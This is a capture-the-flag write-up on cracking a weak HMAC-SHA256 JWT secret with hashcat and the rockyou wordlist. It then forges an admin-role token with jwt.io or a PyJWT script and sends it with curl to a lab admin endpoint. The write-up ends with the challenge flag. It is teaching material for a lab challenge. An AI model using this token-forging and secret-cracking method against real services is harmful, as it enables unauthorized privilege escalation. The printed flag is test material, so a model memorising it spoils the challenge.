# JWT Token Exploitation - CTF Writeup  

## Challenge Overview  
This challenge involved cracking a JWT token using `hashcat` or `john`, modifying it, and gaining access to the admin dashboard. It was a moderately difficult challenge requiring an understanding of JWT signing mechanisms.  

[![1.png](https://i.postimg.cc/pXPMGSFQ/1.png)](https://postimg.cc/xqpZqtgq)  

## Step 1: Registering a User  
First, we register a new user. This account is granted a low-privilege role.  

[![2.png](https://i.postimg.cc/90pKHW7d/2.png)](https://postimg.cc/2L124NTy)  

After registration, we receive a JWT token. A JWT (JSON Web Token) consists of three parts:  

1. **Header** – Defines the signing algorithm (e.g., HMAC-SHA256).  
2. **Payload** – Contains user-specific claims (e.g., username, role).  
3. **Signature** – Ensures integrity, generated using a secret key.  

Example JWT token received:  

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InlhaHlhIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NDI4MTcxNDN9.AbihSj2RSBu1qjcsrQ1gG8Arp0kAfKUHSuBCUSZI7ds
```

Decoding the payload reveals:  

```json
{
  "username": "yahya",
  "role": "user",
  "exp": 1742817143
}
```

The token is signed using HMAC-SHA256, meaning a secret key was used to generate the signature. If we can discover this secret, we can create our own valid tokens.  

---

## Step 2: Cracking the JWT Secret  
Since the token uses **HMAC-SHA256**, the server likely verifies it using a secret key. Our goal is to crack this secret.  

We extract the JWT signature and brute-force it using `hashcat` with the `rockyou.txt` wordlist:  

```bash
hashcat -m 16500 jwt_hash.txt rockyou.txt --force
```

[![3.png](https://i.postimg.cc/wTwZWjHH/3.png)](https://postimg.cc/ZCywnZCD)  

✅ The cracked secret key is: **rednut123_**  

---

## Step 3: Modifying the JWT Token  

Now that we have the secret key, we can modify the token to escalate privileges by changing the role from `user` to `admin`.  

### Method 1: Modifying via JWT.io  
1. Go to [JWT.io](https://jwt.io/).  
2. Paste the original token.  
3. Modify the payload:  

```json
{
  "username": "yahya",
  "role": "admin",
  "exp": 1742817899
}
```

4. Re-sign the token using the secret **rednut123_**.  
5. Copy the newly generated token.  

[![4.png](https://i.postimg.cc/KjJqsJ6Q/4.png)](https://postimg.cc/kRRv2FXt)  

---

### Method 2: Generating a New JWT with Python  
We can also programmatically generate a new token using Python and `PyJWT`:  

```python
import jwt

header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "yahya", "role": "admin", "exp": 1742817899}
secret = "rednut123_"

new_token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print(new_token)
```

Running this script generates a valid **admin-level JWT token**.  

[![5.png](https://i.postimg.cc/fLs8zGZB/5.png)](https://postimg.cc/NyN6bPKH)  

---

## Step 4: Accessing the Admin Dashboard  

With our new JWT, we can now authenticate as an **admin**.  

Using `curl`, we send a request with the modified token:  

```bash
curl -H "Authorization: Bearer <NEW_ADMIN_JWT>" http://192.168.11.112:8000/admin
```

[![6.png](https://i.postimg.cc/MZd9w3Lm/6.png)](https://postimg.cc/JtHNcxMs)  

✅ **Admin access granted!**  

---

## Conclusion  

We successfully bypassed authentication by exploiting the weak JWT secret. This challenge demonstrated:  

- How to decode and analyze a JWT token.  
- Brute-forcing weak secrets with `hashcat`.  
- Crafting a new JWT to escalate privileges.  

### 🔥 **Flag:**  
```
CSP{Js0n_W3b_T0k3n5_Cracking_M4st3r_}
```

